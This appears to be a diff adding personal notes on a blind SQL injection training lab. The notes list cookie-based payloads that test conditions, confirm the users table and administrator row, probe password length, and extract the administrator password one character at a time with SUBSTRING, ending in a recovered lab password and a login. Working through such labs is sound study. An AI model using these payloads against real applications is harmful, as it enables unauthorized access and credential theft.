@@ -1,0 +1,43 @@
+LAB DESCRIPTION
+1. Blind SQLi vuln. App uses a tracking cookie for analytics
+2. app performs SQL query in valued of submitted cookie
+3. if db returns rows , app shows "Welcome Back" msg
+4. Table Users with cols: password, users
+
+GOAL
+1. perform Blind SQLi and login as administrator
+
+PREREQUISITE
+
+1. UNION attacks are not effective since one can't see the results
+2. Using Bracketing method 
+' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+
+To edit cookie : press f12 --> Go to storage --> cookies --> TrackingId
+
+ANALYSIS
+
+1. Checking for Blind SQL
+    a) TrackingId=ksdjfkajdfdf8' and '1'= '1
+        display page with "Welcome Back"
+    b) TrackingId=ksdjfkajdfdf8' and '1'= '2
+        No welcome back msg
+    App contains blind SQLi
+2. check if users table exit
+    a) TrackingId=..' and (select 'a' from users LIMIT 1) = 'a'--
+        <welcome back>
+    for every entry in users table( if exists) then it will output 'a', 
+    which when equal to 'a' evaluates the statement to TRUE else FALSE
+3. Check if administrator exists in users table
+    ' and (select username from users WHERE username = 'administrator') = 'administrator'--
+4. creating payload to enumerate admin's password
+    A) determine length of password
+        ' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password)>1)='administrator'--
+            password length: 20
+        ' AND SUBSTRING((SELECT password FROM users WHERE username = 
+        administrator), 1, 1) = 'a'
+    B) Getting administrator password
+        ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a'--
+            al89pt4tvr4l8psvcm3w
+5. Login with credentials
+    <Logged in>            
